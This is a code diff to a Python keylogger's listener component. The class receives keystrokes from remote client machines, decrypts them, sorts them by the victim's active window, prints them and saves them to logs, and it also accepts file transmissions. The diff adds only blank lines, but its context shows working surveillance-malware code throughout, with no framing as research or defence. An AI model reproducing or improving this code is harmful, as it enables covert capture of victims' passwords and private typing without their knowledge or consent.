@@ -45,6 +45,7 @@ class KeyloggerListener:
         self.client_windows = {}  # {client_ip: current_window}
         self.window_buffers = {}  # {client_ip: {window: text_buffer}}
 
+
         if use_encryption and encryption_key:
             self.cipher = Fernet(encryption_key.encode() if isinstance(encryption_key, str) else encryption_key)
 
@@ -167,10 +168,13 @@ class KeyloggerListener:
                 self.client_windows[client_ip] = None
                 self.window_buffers[client_ip] = {}
 
+
             # Check if window changed
             if self.client_windows[client_ip] != window:
                 # Display window separator
+
                 print(f"\n\n{'='*28}||  {window}  ||{'='*28}\n")
+
 
                 # Update current window
                 self.client_windows[client_ip] = window
@@ -183,6 +187,7 @@ class KeyloggerListener:
             buffer = self.window_buffers[client_ip][window]
 
             # Process the keystroke - SIMPLIFIED VERSION
+
             key_display = ''
             buffer_modified = False
 
@@ -192,15 +197,19 @@ class KeyloggerListener:
 
                 if key_name == 'SPACE':
                     buffer += ' '
+
                     key_display = ' '
                     buffer_modified = True
 
                 elif key_name == 'ENTER':
+
                     buffer += '\n'
+
                     print()
                     buffer_modified = True
 
                 elif key_name == 'BACKSPACE':
+
                     # Just display the action
                     key_display = ' [⌫] '
 
@@ -227,6 +236,7 @@ class KeyloggerListener:
 
                 elif key_name == 'TAB':
                     buffer += '\t'
+
                     key_display = '[TAB]'
                     buffer_modified = True
 
@@ -234,6 +244,7 @@ class KeyloggerListener:
                     # Other special keys (just display)
                     key_display = f'[{key_name}]'
             else:
+
                 # Regular character - add to buffer
                 buffer += key
                 key_display = key
@@ -246,6 +257,7 @@ class KeyloggerListener:
             # Display the character/action
             if key_display:
                 print(key_display, end='', flush=True)
+
 
             if self.save_logs:
                 self._save_keystroke(keystroke, timestamp, client_address)
@@ -286,6 +298,8 @@ class KeyloggerListener:
             self.client_windows[client_ip] = None
             self.window_buffers[client_ip] = {}
 
+
+
         elif msg_type == 'disconnect':
             session_data = message.get('data', {})
             session_id = session_data.get('session_id', 'unknown')
@@ -298,6 +312,7 @@ class KeyloggerListener:
                 del self.client_windows[client_ip]
             if client_ip in self.window_buffers:
                 del self.window_buffers[client_ip]
+
 
         elif msg_type == 'file':
             print(f"\n[FILE] File transmission from {client_ip} (not fully implemented in this handler)")
